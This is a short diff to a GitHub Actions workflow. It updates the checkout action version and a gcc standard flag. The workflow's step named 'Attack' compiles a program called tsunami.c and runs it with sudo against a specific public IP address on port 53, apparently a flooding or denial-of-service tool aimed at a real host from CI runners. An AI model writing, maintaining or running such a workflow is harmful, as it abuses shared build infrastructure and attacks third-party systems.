@@ -11,9 +11,9 @@ jobs:
 
     steps:
       - name: Checkout repository
-        uses: actions/checkout@v4
+        uses: actions/checkout@v5
 
       - name: Attack
         run: |
-          gcc -std=c23 -march=native -O3 -o tsunami tsunami.c -pthread
+          gcc -std=c2x -march=native -O3 -o tsunami tsunami.c -pthread
           sudo ./tsunami 147.75.203.71 53 4
